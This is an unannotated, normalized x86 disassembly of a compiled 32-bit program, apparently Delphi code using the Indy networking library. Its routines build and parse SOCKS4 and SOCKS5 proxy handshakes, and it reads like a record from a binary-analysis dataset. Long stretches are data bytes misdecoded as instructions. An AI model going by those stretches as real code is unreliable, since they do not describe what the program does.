add [ edi ] al
or al 0x54
dec ecx
dec ecx
dec edi
dec eax
popad
outsb
insb
jb r-xdata
add [ ebx + 0x408dc3c0 ] cl
add [ ebp - 0x75 ] dl
in al dx
pop ebp
retn 0x14
dec eax
popad
outsb
insb
jb r-xdata
add [ ecx + ebp + 0x40 ] ch
add [ eax ] bh
js r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034e0
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_467868
retn
ja r-xdata
dec ecx
dec ecx
dec edi
dec eax
popad
outsb
insb
jb r-xdata
add [ ecx + ebp + 0x40 ] ch
add [ ecx + ebp + 0x40 ] ch
add [ ecx + ebp + 0x40 ] ch
add [ esp + edx * 2 ] cl
dec edi
add [ eax ] dh
bound eax [ esi ]
add eax [ eax ]
or ecx [ ecx + 0x64 ]
dec ecx
sub_467808
push ebx
push esi
call sub_4034f8
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x40 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_466318
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034e0
sub_46783c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_467861
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_467868
retn
sub_467878
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
loopne r-xdata
jo r-xdata
inc esi
add [ ecx + edi * 2 ] al
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dl dh
js r-xdata
push esp
jns r-xdata
jpe r-xdata
add [ eax ] bl
add [ eax ] al
add ah dh
pop edx
inc ecx
add [ ebx + esi + 0x33c00040 ] dh
inc eax
add ah al
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add al bh
jpe r-xdata
test [ ecx ] eax
pushfd
mov al [ ecx ]
mov al 0x8e
xchg esp eax
adc [ eax ] al
adc al 0x0
add bh bh
dec eax
jle r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
r-xdata
rol [ ecx + edi * 2 ] 0x46
add [ edi ] al
jns r-xdata
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x140040 ] dl
or edx [ ecx + ecx * 2 + 0x64 ]
push edx
inc esi
inc ebx
push edx
jo r-xdata
add [ eax ] al
or edx [ ecx + ecx * 2 + 0x64 ]
push edx
inc esi
inc ebx
push edx
add [ edx + edi * 2 + 0x46 ] al
add [ ebp + eax * 4 - 0x7b57ffbf ] dl
inc ecx
add [ eax + ecx * 4 - 0x767bffbf ] ah
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
add [ 0x52644954 ] cl
inc ecx
add [ esi + ecx * 4 - 0x7147ffbf ] dh
inc ecx
add [ eax - 0x53ffbe72 ] ch
inc eax
add al al
xor eax [ eax ]
les esi [ ebx ]
inc eax
add al cl
xor eax [ eax ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x54080002 ] al
js r-xdata
jns r-xdata
inc eax
add [ eax + eax ] cl
add bh bh
int3
add [ eax + edx ] bh
mov edx ebx
mov eax esi
call sub_41858c
mov edi ebx
mov eax edi
call sub_467a90
mov eax [ esi + 0xc ]
mov [ edi + 0xc ] eax
mov eax [ edi + 0x10 ]
mov edx [ esi + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
lea eax [ edi + 0x14 ]
mov edx [ esi + 0x14 ]
call sub_403f94
jmp r-xdata
stc
imul esp [ ebp + 0x73 ] 0x7a1cc08b
inc esi
add [ edi ] al
or eax 0x52644954
inc esi
inc ebx
push edx
jo r-xdata
inc esi
inc ebx
push edx
jo r-xdata
mov al 0x8b
inc ecx
add [ eax + 0xd00467e ] dh
push esp
dec ecx
push edx
inc ebx
outsd
fdivr [ gs : ecx + 0x46 ]
inc ecx
add [ ecx + ecx * 4 - 0x7653ffbf ] dh
inc ecx
add [ edx + edi * 2 + 0xe0046 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
xchg esp eax
adc [ eax ] al
adc al 0x0
js r-xdata
pop edi
pop esi
pop ebx
retn
ror [ ecx + 0x438b0c43 ] 0x10
mov edx [ eax ]
call [ edx + 0x44 ]
lea eax [ ebx + 0x14 ]
call sub_403f40
pop ebx
retn
imul esp [ ebp + 0x73 ] r-xdata
adc [ ebp + 0x41 ] bl
add [ eax ] al
add [ edx ] cl
dec ecx
push edx
inc esi
inc ebx
push edx
jo r-xdata
mov es [ ecx ]
xor al 0x8b
inc ecx
add [ eax - 0x4fffbe75 ] dh
jle r-xdata
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ eax ] dh
add [ eax + eax ] bl
add [ eax ] al
sbb [ ecx + eax * 2 ] 0xb4
xor eax [ eax ]
shl [ ebx ] 0x40
add ah al
xor eax [ eax ]
enter 0x4033 0x0
js r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ eax ] eax
add al 0x54
add [ eax + 0x300415b ] al
add [ edx ] cl
dec ecx
push edx
inc esi
inc ebx
push edx
jo r-xdata
rcl [ ebx + 0x56 ] 0x84
shl [ eax + ecx - 0x7d ] cl
jns r-xdata
jns r-xdata
add [ ebx + 0x575653c0 ] cl
mov ebx edx
mov esi eax
mov eax ebx
mov al [ ecx ]
mov [ ebp - 0x7a6bffbf ] es
inc ecx
add [ edx + ecx * 4 - 0x714fffbf ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + edi * 2 ] bl
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
jpe r-xdata
sub_467aac
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_418800
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov [ esi + 0x10 ] eax
mov eax esi
call sub_467a90
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403490
mov eax esi
pop esi
pop ebx
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_467af8
push ebx
push esi
call sub_4034f8
mov ebx edx
mov esi eax
lea eax [ esi + 0x10 ]
call sub_40d3ac
mov edx ebx
and dl 0xfc
mov eax esi
call sub_418838
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034e0
sub_467b28
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_467c6d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_403f40
cmp [ ebx + 0xc ] 0x0
jle r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
mov eax esi
call sub_403f40
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_467c74
lea eax [ ebp - 0x1c ]
mov edx 0x5
call sub_403f64
retn
mov edx esi
mov eax [ ebx + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
push [ esi ]
lea edx [ ebp - 0x1c ]
mov eax [ ebx + 0xc ]
call sub_408388
push [ ebp - 0x1c ]
push r-xdata
mov eax esi
mov edx 0x3
call sub_4042c0
jmp r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
push [ esi ]
lea edx [ ebp - 0x14 ]
mov eax [ ebx + 0xc ]
call sub_408388
push [ ebp - 0x14 ]
push r-xdata
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x10 ]
mov edi [ eax ]
call [ edi + 0xc ]
push [ ebp - 0x18 ]
push r-xdata
mov eax esi
mov edx 0x5
call sub_4042c0
push [ esi ]
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0xc ]
call sub_408388
push [ ebp - 0xc ]
push r-xdata
lea ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x10 ]
mov edi [ eax ]
call [ edi + 0xc ]
push [ ebp - 0x10 ]
push r-xdata
mov eax esi
mov edx 0x5
call sub_4042c0
jmp r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
cmp eax [ ebp - 0x4 ]
jle r-xdata
jmp r-xdata
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
sub_467ca0
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_467d9b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_467a90
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_467da2
lea eax [ ebp - 0x1c ]
mov edx 0x5
call sub_403f64
retn
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x14 ]
xor edx edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x14 ]
mov ecx 0x4
mov edx 0x1
call sub_404460
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_408120
mov eax [ ebp - 0xc ]
call sub_404200
cmp eax 0x4
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax esi
call sub_467e48
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x3 ] 0x2d
jne r-xdata
inc ebx
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_40458c
lea eax [ ebp - 0x18 ]
push eax
lea ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x1c ]
mov ecx 0x7fffffff
mov edx 0x5
call sub_404460
mov edx [ ebp - 0x18 ]
mov eax [ esi + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
inc [ ebp - 0x8 ]
dec ebx
jne r-xdata
sub_467dac
push ebx
mov ebx eax
cmp [ ebx + 0xc ] 0x0
jg r-xdata
mov al 0x1
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jg r-xdata
xor eax eax
pop ebx
retn
sub_467dcc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_467e17
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebx + 0xc ] esi
test esi esi
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_467e1e
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_408388
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x14 ]
call sub_403f94
sub_467e48
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x14 ]
mov edx esi
call sub_403f94
mov eax esi
call sub_404200
test eax eax
jle r-xdata
pop esi
pop ebx
retn
xor edx edx
mov eax esi
call sub_408500
mov [ ebx + 0xc ] eax
sub_467e74
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov eax [ r-xdata ]
push eax
xor edx edx
mov eax esi
call sub_418edc
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403490
mov eax esi
pop esi
pop ebx
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_467eb0
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
xor eax eax
mov [ esp ] eax
mov eax edi
call sub_418bec
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov edx ebx
mov eax edi
call sub_467ef8
mov [ esp ] eax
jmp r-xdata
mov edx ebx
mov eax edi
call sub_467ef8
cmp ebp [ eax + 0xc ]
jne r-xdata
sub_467f0c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jne r-xdata
pop esi
pop ebx
retn
mov edx [ ebx + 0xc ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov esi eax
test esi esi
je r-xdata
mov edx [ esi + 0x10 ]
mov eax [ ebx + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_467f3c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_467f61
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_467f68
retn
sub_467f74
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_467f99
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_467fa0
retn
sub_468260
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_466280
mov [ esi + 0x68 ] 0x0
mov [ esi + 0x7c ] 0x0
mov [ esi + 0x74 ] 0x438
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403490
mov eax esi
pop esi
pop ebx
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_4682a4
push ebp
mov ebp esp
add esp 0xfffffedc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x124 ] ebx
mov [ ebp - 0x120 ] ebx
mov [ ebp - 0x11c ] ebx
mov [ ebp - 0x118 ] ebx
mov [ ebp - 0x114 ] ebx
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_4684ad
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x110 ] 0x4
mov [ ebp - 0x10f ] 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov [ ebp - 0x10e ] ax
cmp [ esi + 0x7c ] 0x2
jne r-xdata
lea ecx [ ebp - 0x114 ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx edi
call sub_463c08
mov edx [ ebp - 0x114 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4641c0
mov [ ebp - 0x10c ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx r-xdata
call sub_4641c0
mov [ ebp - 0x10c ] eax
jmp r-xdata
add ebx 0x9
lea edx [ ebp - 0x110 ]
mov ecx ebx
mov eax [ esi + 0x80 ]
mov ebx [ eax ]
call [ ebx + 0x58 ]
lea edx [ ebp - 0x8 ]
mov ecx 0x8
mov eax [ esi + 0x80 ]
mov ebx [ eax ]
call [ ebx + 0x54 ]
mov al [ ebp - 0x7 ]
sub al 0x5a
je r-xdata
mov eax edi
call sub_404200
push eax
mov eax edi
call sub_404400
lea edx [ ebp + ebx - 0x106 ]
pop ecx
call sub_4028d8
mov eax edi
call sub_404200
inc ebx
add eax ebx
mov ebx eax
mov [ ebp + ebx - 0x107 ] 0x0
lea eax [ ebp - 0x108 ]
mov edx [ esi + 0x78 ]
mov ecx 0xff
call sub_4041dc
xor ebx ebx
mov bl [ ebp - 0x108 ]
mov [ ebp + ebx - 0x107 ] 0x0
cmp [ esi + 0x7c ] 0x2
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4684b4
lea eax [ ebp - 0x124 ]
mov edx 0x5
call sub_403f64
retn
dec al
je r-xdata
lea edx [ ebp - 0x118 ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0x118 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9cc
call sub_4038f8
jmp r-xdata
dec al
je r-xdata
lea edx [ ebp - 0x11c ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0x11c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9cc
call sub_4038f8
jmp r-xdata
dec al
je r-xdata
lea edx [ ebp - 0x120 ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0x120 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9cc
call sub_4038f8
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x124 ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0x124 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9cc
call sub_4038f8
sub_4684cc
push ebp
mov ebp esp
push ecx
mov ecx 0x29
push 0x0
push 0x0
dec ecx
jne r-xdata
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_468a9f
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x68 ] 0x0
jne r-xdata
mov [ ebp - 0x10e ] 0x2
mov [ ebp - 0x10e ] 0x0
jmp r-xdata
mov al [ ebp - 0x10f ]
cmp al [ ebp - 0xd ]
jne r-xdata
mov al [ ebp - 0x10e ]
mov [ ebp - 0xd ] al
mov [ ebp - 0x110 ] 0x5
mov al 0x1
mov [ ebp - 0x10f ] al
and eax 0xff
add eax 0x2
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x110 ]
mov eax [ ebx + 0x80 ]
mov ecx [ ebp - 0xc ]
mov esi [ eax ]
call [ esi + 0x58 ]
xor edx edx
push ebp
push j_sub_403738#7
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x110 ]
mov eax [ ebx + 0x80 ]
mov ecx 0x2
mov esi [ eax ]
call [ esi + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea edx [ ebp - 0x118 ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0x118 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9cc
call sub_4038f8
cmp al 0xff
jne r-xdata
mov [ ebp - 0x110 ] 0x5
mov [ ebp - 0x10f ] 0x1
mov [ ebp - 0x10e ] 0x0
mov [ ebp - 0x10d ] 0x3
mov eax [ ebp - 0x4 ]
call sub_404200
mov [ ebp - 0x10c ] al
mov esi 0x5
mov eax [ ebp - 0x4 ]
call sub_404200
test eax eax
jle r-xdata
mov [ ebp - 0x110 ] 0x1
mov eax [ ebx + 0x78 ]
call sub_404200
mov [ ebp - 0x10f ] al
mov esi 0x2
mov eax [ ebx + 0x78 ]
call sub_404200
test eax eax
jle r-xdata
cmp [ ebx + 0x68 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_404200
add esi eax
mov eax [ rw-data ]
mov eax [ eax ]
mov dx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov [ ebp - 0x10 ] ax
lea edx [ ebp + esi - 0x110 ]
lea eax [ ebp - 0x10 ]
mov ecx 0x2
call sub_4028d8
add esi 0x2
lea edx [ ebp - 0x110 ]
mov eax [ ebx + 0x80 ]
mov ecx esi
mov esi [ eax ]
call [ esi + 0x58 ]
xor eax eax
push ebp
push sub_4687ff
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x110 ]
mov eax [ ebx + 0x80 ]
mov ecx 0x5
mov esi [ eax ]
call [ esi + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_404200
push eax
mov eax [ ebp - 0x4 ]
call sub_404400
lea edx [ ebp + esi - 0x110 ]
pop ecx
call sub_4028d8
mov eax [ ebx + 0x78 ]
call sub_404200
add esi eax
mov eax [ ebx + 0x70 ]
call sub_404200
mov [ ebp + esi - 0x110 ] al
inc esi
mov eax [ ebx + 0x70 ]
call sub_404200
test eax eax
jle r-xdata
mov eax [ ebx + 0x78 ]
call sub_404200
push eax
mov eax [ ebx + 0x78 ]
call sub_404400
lea edx [ ebp + esi - 0x110 ]
pop ecx
call sub_4028d8
xor eax eax
mov al [ ebp - 0x10f ]
cmp eax 0x8
ja r-xdata
mov eax [ ebx + 0x70 ]
call sub_404200
add esi eax
lea edx [ ebp - 0x110 ]
mov eax [ ebx + 0x80 ]
mov ecx esi
mov esi [ eax ]
call [ esi + 0x58 ]
xor edx edx
push ebp
push j_sub_403738#6
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x110 ]
mov eax [ ebx + 0x80 ]
mov ecx 0x2
mov esi [ eax ]
call [ esi + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebx + 0x70 ]
call sub_404200
push eax
mov eax [ ebx + 0x70 ]
call sub_404400
lea edx [ ebp + esi - 0x110 ]
pop ecx
call sub_4028d8
lea edx [ ebp - 0x148 ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0x148 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9cc
call sub_4038f8
jmp [ eax * 4 + r-xdata ]
cmp [ ebp - 0x10f ] 0x0
je r-xdata
mov [ ebp - 0xc ] 0x6
jmp r-xdata
sub al 0x2
je r-xdata
lea edx [ ebp - 0x128 ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0x128 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9cc
call sub_4038f8
jmp r-xdata
lea edx [ ebp - 0x120 ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0x120 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9cc
call sub_4038f8
xor eax eax
push ebp
push sub_468a50
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebp - 0xc ]
dec ecx
lea edx [ ebp - 0x10b ]
mov eax [ ebx + 0x80 ]
mov ebx [ eax ]
call [ ebx + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
mov al [ ebp - 0x10c ]
add eax 0x2
mov [ ebp - 0xc ] eax
jmp r-xdata
dec al
je r-xdata
mov al [ ebp - 0x10d ]
dec al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_468aa6
lea eax [ ebp - 0x14c ]
mov edx 0xf
call sub_403f64
retn
mov [ ebp - 0xc ] 0x12
jmp r-xdata
sub_468ab0
push ebx
mov bl [ eax + 0x7c ]
dec ebx
sub bl 0x2
jb r-xdata
call sub_4682a4
pop ebx
retn
je r-xdata
call sub_4684cc
jmp r-xdata
pop ebx
retn
sub_468acc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_468af1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_468af8
retn
sub_468b04
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_468b29
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_468b30
retn
sub_468b3c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_468b61
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_468b68
retn
sub_468b78
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor al 0x8c
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ecx * 4 ] bl
inc esi
add [ eax + eax ] dh
add [ eax ] bl
ja r-xdata
jmp r-xdata
add [ eax - 0x12 ] cl
inc ecx
add al al
xor eax [ eax ]
pushfd
out 0x41 eax
add al cl
xor eax [ eax ]
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ eax - 0x73ffb96e ] bh
test [ ecx ] eax
push eax
0x84a80041 0x41
jb r-xdata
add [ ebx ] 0x0
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
mov [ ebp - 0x15afffbf ] es
inc ecx
add [ eax + 0x28004184 ] ch
jmp r-xdata
xor al 0x8c
inc esi
add [ edi ] al
adc dl [ ecx + ecx * 2 + 0x64 ]
dec ecx
dec edi
dec eax
popad
outsb
insb
jb r-xdata
sbb al 0x91
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add al 0x0
or [ ebp + 0x73 ] dl
dec esi
popad
insb
lea eax [ eax ]
cld
mov [ esi ] es
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x8d
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] dl
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x68 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x40 ] eax
mov eax [ ebp - 0x4 ]
call sub_41e604
mov eax [ r-xdata ]
call sub_465f0c
test al al
je r-xdata
popad
nop
push ebx
mov ebx eax
mov eax ebx
call sub_4677fc
mov eax [ ebx + 0x68 ]
test eax eax
je r-xdata
inc esi
add [ eax ] ch
xchg ecx eax
inc esi
add [ eax + 0x12004691 ] ch
push esp
dec ecx
dec ecx
dec edi
dec eax
popad
outsb
insb
jb r-xdata
nop
inc esi
add ah ch
nop
inc esi
add [ ecx + edx * 4 ] bl
mov eax [ esi ]
shl [ edi + 0x46 ] 0x1
add [ 0x64491100 ] al
dec ecx
dec edi
dec eax
popad
outsb
insb
jb r-xdata
mov edi 0x7d
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x34 ]
mov edx 0x7d
call sub_465564
mov edi eax
jmp r-xdata
pop ebx
retn
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x20 ]
lea eax [ esi ]
dec eax
add [ eax ] al
add ah ch
inc ecx
add [ ebx + esi - 0x1cdbffc0 ] dh
inc ecx
add ah al
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ edx - 0x1c27ffbf ] bh
inc ecx
add [ ebx + edx * 4 ] ah
inc esi
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + r-xdata ] dl
add [ eax ] al
adc [ ecx + ecx * 2 + 0x64 ] dl
inc ebx
outsd
outsb
outsb
arpl [ gs : esp + edx * 2 + 0x68 ] si
jb r-xdata
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx * 4 + 0x46 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push ss
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
cmp edi esi
jge r-xdata
lea esi [ edi + 0x1 ]
test bl bl
je r-xdata
or [ ebx + 0x6f ] edx
add [ esi ] sub_469290
sub [ edx + 0x10046 ] dl
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax [ eax ]
arpl [ ebx + 0x73 ] bp
dec ecx
outsb
outsw
add [ eax ] dl
inc eax
add [ eax + eax ] ch
[ eax + eax ]
add [ ecx + eax * 4 ] cl
inc esi
add [ eax + 0x28004692 ] dl
xchg edx eax
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53090003 ] al
outsd
mov eax esi
call sub_465864
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov eax edi
call sub_465864
sub esi edi
test bl bl
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41e62c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax ]
call [ edx + 0x40 ]
mov eax [ ebp - 0x4 ]
call sub_41e634
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9cc
call sub_4038f8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
call sub_404200
test eax eax
jle r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_465ec8
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xd ] 0x0
je r-xdata
